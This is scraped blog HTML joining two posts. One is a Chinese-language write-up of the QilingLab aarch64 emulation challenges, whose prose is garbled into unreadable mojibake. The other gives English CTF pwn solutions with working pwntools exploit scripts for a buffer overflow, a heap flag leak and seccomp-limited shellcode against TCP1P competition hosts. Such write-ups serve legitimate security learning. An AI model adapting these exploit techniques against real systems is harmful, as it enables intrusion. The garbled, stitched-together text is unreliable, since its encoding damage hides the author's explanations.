&lt;p&gt;ä¸€ç›´ä»¥æ¥ä½¿ç”¨qemuæ¥ä»¿çœŸè·¯ç”±å™¨å›ºä»¶ï¼Œæœ‰æ—¶å€™é’ˆå¯¹ä¸åŒå›ºä»¶éœ€è¦åšå¤§é‡é…ç½®æ–‡ä»¶çš„ä¿®æ”¹ï¼Œå¹¶ä¸”æœ‰æ—¶ä¾¯æˆ‘åªéœ€è¦é’ˆå¯¹æŸä¸€ä¸ªæœåŠ¡è¿›è¡Œåˆ†æ&lt;br&gt;
ç”±æ­¤èŒå‘äº†å­¦ä¹ qilingæ¡†æ¶çš„å¿µå¤´ï¼Œä¸€ç›´ä»¥æ¥å¯¹è¯¥æ¡†æ¶çš„è·¨å¹³å°è·¨æ¶æ„æœ‰æ‰€è€³é—»ï¼ŒåŠ«æŒç³»ç»Ÿè°ƒç”¨ï¼Œhookå‡½æ•°ä¹Ÿååˆ†æ–¹ä¾¿&lt;br&gt;
æœ¬æ–‡qilinglabä¸»è¦å°±æ˜¯ä¸ºç†Ÿæ‚‰qilingæ¡†æ¶è€Œå†™ï¼Œç¨‹åºåˆ†åˆ«æœ‰11ä¸ªchallengeï¼Œæ¯å®Œæˆä¸€ä¸ªchallengeåéƒ½ä¼šæ˜¾ç¤ºsolved&lt;/p&gt;
&lt;h3 id=&#34;challenge1&#34;&gt;challenge1ï¼š&lt;/h3&gt;
&lt;p&gt;è¿™éƒ¨åˆ†æˆ‘ä»¬éœ€è¦å°†&lt;code&gt;0x1337&lt;/code&gt;åœ°å€å¤„çš„å€¼æ”¹ä¸º&lt;code&gt;1337&lt;/code&gt;&lt;br&gt;
è¯¥åœ°å€æ‰€åœ¨å†…å­˜æœªè¢«æ˜ å°„&lt;br&gt;
é¦–å…ˆæˆ‘ä»¬éœ€è¦æ˜ å°„ä¸€å—å†…å­˜ï¼Œä¸”éœ€è¦æ»¡è¶³é¡µå¯¹é½&lt;br&gt;
ç„¶åå†™å…¥æ˜ å°„å†…å­˜&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from qiling import *
from qiling.const import *
import sys

def challenge1(ql):  
    ql.mem.map(0x1000,0x1000,info=&#39;challenge1&#39;) #æ³¨æ„å†…å­˜é¡µå¯¹é½
    ql.mem.write(0x1337,ql.pack64(1337))

if __name__ == &amp;quot;__main__&amp;quot;:
    path=[&#39;qilinglab-aarch64&#39;]
	rootfs=&amp;quot;../../rootfs/arm64_linux&amp;quot;
    ql=Qiling(path,rootfs,verbose=QL_VERBOSE.OFF)
    
    challenge1(ql)
    
    ql.run()
    
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge2&#34;&gt;challenge2ï¼š&lt;/h3&gt;
&lt;p&gt;è¯¥éƒ¨åˆ†æŒ‘æˆ˜è°ƒç”¨&lt;code&gt;uname&lt;/code&gt;å‡½æ•°ï¼Œå°†ç›¸å…³ä¿¡æ¯å­˜å…¥ä¸€ä¸ª&lt;code&gt;utsname&lt;/code&gt;çš„ç»“æ„ä½“ä¸­&lt;br&gt;
æˆ‘ä»¬éœ€è¦åœ¨ç»“æ„ä½“å¯¹åº”éƒ¨åˆ†ï¼ˆ&lt;code&gt;sysname &amp;amp;&amp;amp; version&lt;/code&gt;ï¼‰å†™å…¥æŒ‡å®šå€¼ç»•è¿‡æ¯”è¾ƒï¼Œæœ€åè¿”å›æ­£å¸¸å€¼æ¥å®ŒæˆæŒ‘æˆ˜&lt;br&gt;
ç³»ç»Ÿè°ƒç”¨è¿”å›æ—¶,ç»“æ„ä½“ç›¸å…³æ•°æ®æˆå‘˜çš„åœ°å€å¯ç”±&lt;code&gt;sp&lt;/code&gt;å¯„å­˜å™¨å€¼åŠ ä¸Šåç§»å¾—å‡º&lt;br&gt;
åœ¨ç³»ç»Ÿè°ƒç”¨å®Œä¹‹åæ‰§è¡Œhookå‡½æ•°ï¼Œ&lt;code&gt;QL_INTERCEPT.EXIT&lt;/code&gt;&lt;br&gt;
ä½¿ç”¨Â &lt;code&gt;ql.arch.regs.sp&lt;/code&gt;å¾—åˆ°&lt;code&gt;sp&lt;/code&gt;ä¸­å­˜å‚¨çš„æ•°æ®æˆå‘˜åœ°å€å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def my_uname_on_exit_hook(ql,*args):
#     struct utsname {
#     char sysname[65];
#     char nodename[65];
#     char release[65];   
#     char version[65];
#     char machine[65];
#     char domainname[65];
# };

    # 00100d88 e1 03 01 91     add        x1,sp,#0x40
    # 00100d8c 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100d90 e0 3b 80 b9     ldrsw      x0,[sp, #local_1b8]
    # 00100d94 e2 23 07 91     add        x2,sp,#0x1c8
    # 00100d98 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100d9c 3f 00 00 6b     cmp        w1,w0

    sys_addr = ql.arch.regs.sp+0x40
    
    # print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))
    
    ql.mem.write(sys_addr,b&amp;quot;QilingOS&amp;quot;)

    # 00100dd8 e1 0f 04 91     add        x1,sp,#0x103
    # 00100ddc 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100de0 e0 3f 80 b9     ldrsw      x0,[sp, #local_1b4]
    # 00100de4 e2 63 07 91     add        x2,sp,#0x1d8
    # 00100de8 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100dec 3f 00 00 6b     cmp        w1,w0

    version_addr = ql.arch.regs.sp+0x103
    
    # print(&amp;quot;version_addr: &amp;quot;,hex(version_addr))
    
    ql.mem.write(version_addr,b&amp;quot;ChallengeStart&amp;quot;)
    
def challenge2(ql):
    ql.os.set_syscall(&amp;quot;uname&amp;quot;,my_uname_on_exit_hook,QL_INTERCEPT.EXIT)
    
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge3&#34;&gt;challenge3:&lt;/h3&gt;
&lt;p&gt;è¯¥éƒ¨åˆ†æŒ‘æˆ˜ä»&lt;code&gt;/dev/urandom&lt;/code&gt;ä¸­å…ˆè¯»å…¥&lt;code&gt;0x20&lt;/code&gt;ä¸ªå­—èŠ‚ï¼Œå†è¯»1å­—èŠ‚&lt;br&gt;
ç„¶åè°ƒç”¨&lt;code&gt;getrandom&lt;/code&gt;è·å–&lt;code&gt;0x20&lt;/code&gt;å­—èŠ‚&lt;br&gt;
è¿™é‡Œéœ€è¦è®©&lt;code&gt;getrandom&lt;/code&gt;è·å–çš„&lt;code&gt;0x20&lt;/code&gt;å­—èŠ‚ä¸ä»&lt;code&gt;/dev/urandom&lt;/code&gt;çš„&lt;code&gt;0x20&lt;/code&gt;å­—èŠ‚ç›¸åŒä¸”ä¸å¼€å§‹çš„1å­—èŠ‚ä¸åŒ&lt;br&gt;
æˆ‘ä»¬è¿™é‡Œé€šè¿‡è‡ªå®šä¹‰æ–‡ä»¶å¯¹è±¡å’Œè‡ªå·±hookä¸€ä¸ª&lt;code&gt;getrandom&lt;/code&gt;æ¥å®ç°&lt;br&gt;
hookå‡½æ•°å¯¹ç…§åŸå‡½æ•°å®ç°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1698638869071.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è‡ªå®šä¹‰æ–‡ä»¶å¯¹è±¡æ˜¯é€šè¿‡&lt;code&gt;QlFsMappedObject&lt;/code&gt;å®ç°çš„ï¼Œå…¶ä¸­è‡³å°‘éœ€è¦ä¸€ä¸ª&lt;code&gt;close()&lt;/code&gt;,å…¶ä»–ç³»ç»Ÿè°ƒç”¨æ ¹æ®éœ€æ±‚ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä»&lt;code&gt;/dev/urandom&lt;/code&gt;ä¸­è¯»å…¥æ•°æ®åˆ°æ ˆä¸Šï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ª&lt;code&gt;read&lt;/code&gt;çš„ç³»ç»Ÿè°ƒç”¨ï¼ŒåŒºåˆ†å•ç‹¬è¯»å…¥1å­—èŠ‚çš„æƒ…å†µ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class Fake_urandom(QlFsMappedObject):
    def read(self,size):
        if size == 1:
            return b&amp;quot;\x32&amp;quot;
        else:
            return b&amp;quot;\x00&amp;quot;*size
        
    def close(self):
        return 0
    
def getrandom_hook(ql,buf,size,flags):
    ql.mem.write(buf,b&amp;quot;\x00&amp;quot;*size)
    return 0
    
def challenge3(ql):
    ql.add_fs_mapper(&#39;/dev/urandom&#39;,Fake_urandom())
    ql.os.set_syscall(&amp;quot;getrandom&amp;quot;,getrandom_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge4&#34;&gt;challenge4ï¼š&lt;/h3&gt;
&lt;p&gt;å¦‚å›¾ï¼Œè¯¥å¾ªç¯æ˜¯ä¸æˆç«‹çš„ï¼Œä¸ºäº†å®Œæˆchallenge4æˆ‘ä»¬éœ€è¦è¿›å…¥å¾ªç¯ä¸­&lt;br&gt;
æˆ‘ä»¬é€šè¿‡hook cmpæŒ‡ä»¤å¤„ï¼Œä½¿&lt;code&gt;w0&amp;gt;0&lt;/code&gt;å³å¯&lt;br&gt;
åœ¨æ‰§è¡Œcmpè¿™æ¡æŒ‡ä»¤ä¹‹å‰æˆ‘ä»¬ä¼šè°ƒç”¨hookå‡½æ•°ï¼Œæ‰€ä»¥æœ€å&lt;code&gt;w0&amp;gt;0&lt;/code&gt;ï¼Œæˆ‘ä»¬ä¹Ÿå¾—ä»¥è¿›å…¥è¯¥å¾ªç¯&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1698638877619.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_cmp_address(ql):
    ql.arch.regs.w0=1

def challenge4(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0xfe0
    ql.hook_address(hook_cmp_address,cmp_addr)

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge5&#34;&gt;challenge5:&lt;/h3&gt;
&lt;p&gt;ç¬¬ä¸€ä¸ªå¾ªç¯èµ‹å€¼&lt;br&gt;
éœ€è¦ç»•è¿‡ç¬¬äºŒä¸ªå¾ªç¯ï¼Œæœ€ç®€å•æ–¹æ³•ä½¿&lt;code&gt;rand()&lt;/code&gt;è¿”å›å€¼ä¸º0å³å¯&lt;br&gt;
ä¹‹å‰æˆ‘ä»¬çš„challenge3æ˜¯åŠ«æŒç³»ç»Ÿè°ƒç”¨ï¼Œè¯¥éƒ¨åˆ†æˆ‘ä»¬åŠ«æŒå¤–éƒ¨å‡½æ•°ï¼Œä½¿ç”¨&lt;code&gt;ql.os.set_api()&lt;/code&gt;æ¥åŠ«æŒ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def rand_hook(ql):
    ql.arch.regs.w0=0

def challenge5(ql):
    ql.os.set_api(&amp;quot;rand&amp;quot;,rand_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge6&#34;&gt;challenge6:&lt;/h3&gt;
&lt;p&gt;è·³å‡ºæ­»å¾ªç¯ï¼Œè·Ÿchallenge4ä¸€æ ·åœ¨cmpä¹‹å‰hookä¿®æ”¹å¯„å­˜å™¨å€¼å³å¯è·³å‡º&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_cmp1_address(ql):
    ql.arch.regs.w0=0

def challenge6(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0x1118
    ql.hook_address(hook_cmp1_address,cmp_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge7&#34;&gt;challenge7:&lt;/h3&gt;
&lt;p&gt;è·³å‡º&lt;code&gt;sleep(0xffffffff)&lt;/code&gt;&lt;br&gt;
è·Ÿchallenge5ä¸€æ ·ï¼Œè¯¥éƒ¨åˆ†æˆ‘ä»¬åªéœ€åŠ«æŒ&lt;code&gt;sleep&lt;/code&gt;å‡½æ•°è°ƒç”¨å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def sleep_hook(ql,*args):
    ql.arch.regs.w0=0
    
def challenge7(ql):
    ql.os.set_api(&amp;quot;sleep&amp;quot;,sleep_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge8&#34;&gt;challenge8ï¼š&lt;/h3&gt;
&lt;p&gt;è¯¥éƒ¨åˆ†éœ€è¦æˆ‘ä»¬å‘&lt;code&gt;check&lt;/code&gt;ä¸Šå†™å€¼ï¼Œç¡®å®šè¯¥åœ°å€çš„æ–¹æ³•æ˜¯é€šè¿‡magic_numå»å¯»æ‰¾&lt;br&gt;
ä½¿ç”¨&lt;code&gt;ql.mem.search&lt;/code&gt;ï¼Œå¦‚æœæ‰¾åˆ°å¤šä¸ªåœ°å€ï¼Œåˆ™æ ¹æ®æœ¬é¢˜è·ç¦»&lt;code&gt;magic_num_addr-0x8&lt;/code&gt;å¤„çš„å­—ç¬¦ä¸²æ˜¯å¦ä¸º&amp;quot;Random data&amp;quot;æ¥ç¡®å®šï¼Œå¤§è‡´ç»“æ„å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;quot;Random data&amp;quot;
magic_num
check
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def magic_hook(ql):
    magic=0x3dfcd6ea00000539
    magic_addrs=ql.mem.search(ql.pack64(magic))
    for i in magic_addrs:
        malloc_addr=i-0x8
        malloc_data=ql.mem.read(malloc_addr,24)
        string_addr,_,check_addr=struct.unpack(&#39;QQQ&#39;,malloc_data)
        ### è¿™ä¸€è¡Œå°† malloc_data åˆ†æˆ 3ä¸ª64ä½8å­—èŠ‚æ— ç¬¦å·æ•´æ•° ä¼ ç»™å‰é¢çš„å‡ ä¸ªå˜é‡
        if ql.mem.string(string_addr) == &#39;Random data&#39;:
            ql.mem.write(check_addr,b&amp;quot;\x01&amp;quot;)
            break
        
def challnege8(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    hook_addr=base_addr+0x11e0
    ql.hook_address(magic_hook,hook_addr)    
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge9&#34;&gt;challenge9:&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;ql.os.set_api&lt;/code&gt;æ¥hookå‡½æ•°è°ƒç”¨ï¼Œè®©&lt;code&gt;tolower&lt;/code&gt;å¤±æ•ˆå³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def tolower_hook(ql,*args):
    return
    
def challenge9(ql):
    ql.os.set_api(&amp;quot;tolower&amp;quot;,tolower_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge10&#34;&gt;challenge10:&lt;/h3&gt;
&lt;p&gt;è¯¥éƒ¨åˆ†ä»&lt;code&gt;/proc/self/cmdline&lt;/code&gt;è¯»å…¥æ•°æ®å¹¶ä¸&lt;code&gt;qilinglab&lt;/code&gt;è¿›è¡Œæ¯”è¾ƒ&lt;br&gt;
åŠ«æŒæ–‡ä»¶ç³»ç»Ÿå³å¯ï¼Œæ³¨æ„è¿”å›å€¼ä¸º&lt;code&gt;bytes&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class Fake_cmdline(QlFsMappedObject):
    def read(self,size):
        return b&amp;quot;qilinglab&amp;quot;
    
    def close(self):
        return 0
    
def challenge10(ql):
    ql.add_fs_mapper(&#39;/proc/self/cmdline&#39;,Fake_cmdline())
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge11&#34;&gt;challenge11:&lt;/h3&gt;
&lt;p&gt;å†™äº†ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯åœ¨æŒ‡å®šåœ°å€å¤„hook&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_lsr_address(ql):
    ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10

def challenge11(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    lsr_addr=base_addr+0x13f8
    ql.hook_address(hook_lsr_address,lsr_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿˜æœ‰ä¸€ç§æ˜¯hookæŒ‡ä»¤ï¼Œå½“è¿è¡Œåˆ°è¯¥æ¡æŒ‡ä»¤æ—¶(é€šè¿‡æœºå™¨ç è¯†åˆ«æŒ‡ä»¤)ï¼Œä¼šç›´æ¥åŠ«æŒè¯¥æ¡æŒ‡ä»¤&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_mrs_code(ql,address,size):
    if ql.mem.read(address,size) == b&amp;quot;\x00\x00\x38\xd5&amp;quot; :
        ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10
        ql.arch.regs.pc+=4
        

def challenge11_1(ql):
    ql.hook_code(hook_mrs_code)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç”±äºæ‰€æœ‰è¯¥æŒ‡ä»¤éƒ½å°†è¢«åŠ«æŒï¼Œå¸¦æ¥çš„æ€§èƒ½å¼€é”€æ¯”è¾ƒå¤§ï¼Œä¸ªäººæ¯”è¾ƒé’çç¬¬ä¸€ç§æ–¹æ³•ï¼Œå³hookåœ°å€&lt;/p&gt;
&lt;h3 id=&#34;sum&#34;&gt;sumï¼š&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from qiling import *
from qiling.const import *
from qiling.os.mapper import QlFsMappedObject
import struct
import sys
from udbserver import udbserver

def challenge1(ql):  
    ql.mem.map(0x1000,0x1000,info=&#39;challenge1&#39;) #æ³¨æ„å†…å­˜é¡µå¯¹é½
    ql.mem.write(0x1337,ql.pack64(1337))


def my_uname_on_exit_hook(ql,*args):
#     struct utsname {
#     char sysname[65];
#     char nodename[65];
#     char release[65];   
#     char version[65];
#     char machine[65];
#     char domainname[65];
# };

    # 00100d88 e1 03 01 91     add        x1,sp,#0x40
    # 00100d8c 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100d90 e0 3b 80 b9     ldrsw      x0,[sp, #local_1b8]
    # 00100d94 e2 23 07 91     add        x2,sp,#0x1c8
    # 00100d98 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100d9c 3f 00 00 6b     cmp        w1,w0

    sys_addr = ql.arch.regs.sp+0x40
    
    # print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))
    
    ql.mem.write(sys_addr,b&amp;quot;QilingOS&amp;quot;)

    # 00100dd8 e1 0f 04 91     add        x1,sp,#0x103
    # 00100ddc 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100de0 e0 3f 80 b9     ldrsw      x0,[sp, #local_1b4]
    # 00100de4 e2 63 07 91     add        x2,sp,#0x1d8
    # 00100de8 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100dec 3f 00 00 6b     cmp        w1,w0

    version_addr = ql.arch.regs.sp+0x103
    
    # print(&amp;quot;version_addr: &amp;quot;,hex(version_addr))
    
    ql.mem.write(version_addr,b&amp;quot;ChallengeStart&amp;quot;)
    
def challenge2(ql):
    ql.os.set_syscall(&amp;quot;uname&amp;quot;,my_uname_on_exit_hook,QL_INTERCEPT.EXIT)
    

class Fake_urandom(QlFsMappedObject):
    def read(self,size):
        if size == 1:
            return b&amp;quot;\x32&amp;quot;
        else:
            return b&amp;quot;\x00&amp;quot;*size
        
    def close(self):
        return 0
    
def getrandom_hook(ql,buf,size,flags):
    ql.mem.write(buf,b&amp;quot;\x00&amp;quot;*size)
    return 0
    
def challenge3(ql):
    ql.add_fs_mapper(&#39;/dev/urandom&#39;,Fake_urandom())
    ql.os.set_syscall(&amp;quot;getrandom&amp;quot;,getrandom_hook)

def hook_cmp_address(ql):
    ql.arch.regs.w0=1

def challenge4(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0xfe0
    ql.hook_address(hook_cmp_address,cmp_addr)

def rand_hook(ql):
    ql.arch.regs.w0=0

def challenge5(ql):
    ql.os.set_api(&amp;quot;rand&amp;quot;,rand_hook)

def hook_cmp1_address(ql):
    ql.arch.regs.w0=0

def challenge6(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0x1118
    ql.hook_address(hook_cmp1_address,cmp_addr)

def sleep_hook(ql,*args):
    ql.arch.regs.w0=0
    
def challenge7(ql):
    ql.os.set_api(&amp;quot;sleep&amp;quot;,sleep_hook)

def magic_hook(ql):
    magic=0x3dfcd6ea00000539
    magic_addrs=ql.mem.search(ql.pack64(magic))
    for i in magic_addrs:
        malloc_addr=i-0x8
        malloc_data=ql.mem.read(malloc_addr,24)
        string_addr,_,check_addr=struct.unpack(&#39;QQQ&#39;,malloc_data)
        ### è¿™ä¸€è¡Œå°† malloc_data åˆ†æˆ 3ä¸ª64ä½8å­—èŠ‚æ— ç¬¦å·æ•´æ•° ä¼ ç»™å‰é¢çš„å‡ ä¸ªå˜é‡
        if ql.mem.string(string_addr) == &#39;Random data&#39;:
            ql.mem.write(check_addr,b&amp;quot;\x01&amp;quot;)
            break
        
def challnege8(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    hook_addr=base_addr+0x11e0
    ql.hook_address(magic_hook,hook_addr)            

def tolower_hook(ql,*args):
    return
    
def challenge9(ql):
    ql.os.set_api(&amp;quot;tolower&amp;quot;,tolower_hook)

class Fake_cmdline(QlFsMappedObject):
    def read(self,size):
        return b&amp;quot;qilinglab&amp;quot;
    
    def close(self):
        return 0
    
def challenge10(ql):
    ql.add_fs_mapper(&#39;/proc/self/cmdline&#39;,Fake_cmdline())

def hook_lsr_address(ql):
    ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10

def challenge11(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    lsr_addr=base_addr+0x13f8
    ql.hook_address(hook_lsr_address,lsr_addr)
    
def hook_mrs_code(ql,address,size):
    if ql.mem.read(address,size) == b&amp;quot;\x00\x00\x38\xd5&amp;quot; :
        ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10
        ql.arch.regs.pc+=4
        

def challenge11_1(ql):
    ql.hook_code(hook_mrs_code)


if __name__ == &amp;quot;__main__&amp;quot;:
    path=[&#39;qilinglab-aarch64&#39;]
    rootfs=&amp;quot;../../rootfs/arm64_linux&amp;quot;
    ql=Qiling(path,rootfs,verbose=QL_VERBOSE.OFF)

    # udbserver(ql.uc,1234,0)
    
    challenge1(ql)
    challenge2(ql)
    challenge3(ql)
    challenge4(ql)
    challenge5(ql)
    challenge6(ql)
    challenge7(ql)
    challnege8(ql)
    challenge9(ql)
    challenge10(ql)
    challenge11(ql)
    # challenge11_1(ql)
    
    ql.run()
    
&lt;/code&gt;&lt;/pre&gt;
">qiling_lab_aarch64</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/UPbwsdUDa/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN:&lt;/h3&gt;
&lt;h4 id=&#34;bluffer-overflow&#34;&gt;bluffer Overflow:&lt;/h4&gt;
&lt;p&gt;provide us with c source code,just use gcc to compile and the offset to the addr we need to write was &lt;code&gt;0x14&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,17027)
# elf=ELF(&amp;quot;./chall&amp;quot;)

payload=b&amp;quot;\x00&amp;quot;*0x14+p64(0x4e5750)
io.sendlineafter(b&amp;quot;Input: &amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;babyheap&#34;&gt;babyheap:&lt;/h4&gt;
&lt;p&gt;when we call &lt;code&gt;read_flag&lt;/code&gt;, it will &lt;code&gt;malloc(0x70)*7&lt;/code&gt;&lt;br&gt;
just make sure u have spare tcachebin before u call &lt;code&gt;read_flag&lt;/code&gt;&lt;br&gt;
then u can leak flag by &lt;code&gt;view&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,4267)
elf=ELF(&amp;quot;./chall&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()    

for i in range(1,7):
    add(i,0x70,b&amp;quot;aaa&amp;quot;)

for i in range(1,7):
    delete(i)

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)

show(2)
    
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;message&#34;&gt;message:&lt;/h4&gt;
&lt;p&gt;program run our shellcode with seccomp rules added&lt;br&gt;
&lt;code&gt;seccomp-tools dump ./chall&lt;/code&gt; and we get&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/æ–‡æ¡£/match/tcp1p/message$ seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &amp;lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x000000d9  if (A != getdents64) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;which allows &lt;code&gt;getdents64,open,read,write&lt;/code&gt;&lt;br&gt;
the flag name was not &lt;code&gt;flag&lt;/code&gt; anymore,we need to use &lt;code&gt;getdents64&lt;/code&gt; to list all files in current directory&lt;br&gt;
then normal orw shellcode is ok&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,8008)

# gdb.attach(io.pid)
# pause()

io.recvuntil(b&amp;quot;me? \n&amp;quot;)

# list current directory files
# payload = asm(&#39;mov rsp,QWORD PTR fs:[0]&#39;)
# payload += asm(shellcraft.open(&#39;.&#39;))
# payload += asm(shellcraft.getdents64(3, &#39;rsp&#39;, 0x500))
# payload += asm(shellcraft.write(1, &#39;rsp&#39;, 0x500))

# orw flag
payload=asm(shellcraft.open(&amp;quot;flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt&amp;quot;))
payload+=asm(shellcraft.read(3,&#39;rsp&#39;,0x100))
payload+=asm(shellcraft.write(1,&#39;rsp&#39;,0x100))


io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;gamechanger&#34;&gt;gamechanger:&lt;/h4&gt;
&lt;p&gt;pie enabled,full relro&lt;br&gt;
ezbypass the random number&lt;/p&gt;
&lt;p&gt;then we have a chance to overflowï¼Œthe first time we could partial write the ret addr&lt;br&gt;
made it to  &lt;code&gt;_start&lt;/code&gt; ,meanwhile ,due to the &lt;code&gt;printf&lt;/code&gt; we could leak the base addr at the same time&lt;/p&gt;
&lt;p&gt;the second time we enter &lt;code&gt;ask&lt;/code&gt; ,we overflow the ret addr to &lt;code&gt;puts&lt;/code&gt; func,this could print the addr of &lt;code&gt;__funlockfile&lt;/code&gt; ,which we can infer libc base according to this ,ret addr+0x8 to &lt;code&gt;ask&lt;/code&gt;&lt;/p&gt;
